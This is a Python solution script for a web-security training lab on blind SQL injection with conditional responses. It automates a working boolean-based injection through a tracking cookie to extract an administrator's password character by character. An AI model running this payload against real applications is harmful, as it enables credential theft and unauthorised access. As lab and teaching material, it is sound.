#Lab: Blind SQL injection with conditional responses
#PRACTITIONER

#This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
#The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
#The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
#To solve the lab, log in as the administrator user. 

import sys
import urllib3
import urllib
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
Burpsuite = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Sqli_Blind_Password(Url,Cookie_1,Cookie_2):
    Contraseña_Obtenida = ""
    for i in range (1,21):
        for j in range(32,126):
            Payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" %(i,j)
            Encodear_Payload = urllib.parse.quote(Payload)
            Cookies_Payload = {'TrackingId':f'{Cookie_1}'+ Encodear_Payload, 'session':f'{Cookie_2}'}
            SolicitudWeb = requests.get(Url, cookies=Cookies_Payload, verify=False, proxies=Burpsuite)
            if "Welcome" in SolicitudWeb.text:
                Contraseña_Obtenida += chr(j)
                sys.stdout.write('\r'+ Contraseña_Obtenida) #muestra el caracter que esta probando en tiempo real
                sys.stdout.flush() #Convierte el caracter de ASCII a un caracter visible
            else:
                sys.stdout.write('\r'+ Contraseña_Obtenida + chr(j)) #muestra el caracter que esta probando en tiempo real
                sys.stdout.flush() #Convierte el caracter de ASCII a un caracter visible

if __name__ =="__main__":
    try:
        Url = sys.argv[1].strip()
        TrackingId = sys.argv[2].strip()
        Session = sys.argv[3].strip()
        Sqli_Blind_Password(Url,TrackingId,Session)
    except:
        print('[-] Uso: %s <url> <Cookie TrackingId> <Cookie Session> ' %sys.argv[0])
        print('[-] Ejemplo: %s www.ejemplo.com 7fq9WzFMIndKgMgb kyxgl6V3LwOoThuTOqPTX7Nyfr3qjyGD')

